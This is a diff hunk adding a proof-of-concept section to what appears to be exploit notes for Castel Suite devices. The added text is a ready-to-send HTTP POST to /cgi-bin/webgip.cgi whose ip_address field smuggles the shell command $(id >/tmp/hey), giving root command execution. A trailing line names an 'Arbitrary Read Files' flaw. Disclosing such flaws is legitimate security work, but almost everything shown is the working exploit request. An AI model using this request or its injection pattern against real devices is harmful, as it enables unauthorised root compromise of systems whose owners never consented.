@@ -90,6 +90,25 @@ protocol=2&page=35&mode=21&lang=en&bt=54&gid=&fichier_a_envoyer_type=&fichier_a_
 
 
 
+#Code Exec (as root)
+
+POST /cgi-bin/webgip.cgi?lang=fr&affichage=1&gid=130816&page=36 HTTP/1.1
+Host: XX
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+Connection: close
+Cookie: SessId=x; castel_mode_affichage=1; tree_menu=%2Cdhtmlgoodies_treeNode2%2Cdhtmlgoodies_treeNode3%2Cdhtmlgoodies_treeNode5%2Cdhtmlgoodies_treeNode13%2Cdhtmlgoodies_treeNode20%2C
+Upgrade-Insecure-Requests: 1
+
+lang=fr&affichage=1&page=36&onglet=1&gid=130816&mode=11&bt=1&validity_delay=3650&generation_mode=0&ip_address=$(id%20>/tmp/hey)&hostname=GIP406480
+
+
+
+
 #### Castel Suite  #####
 
 Arbitrary Read Files
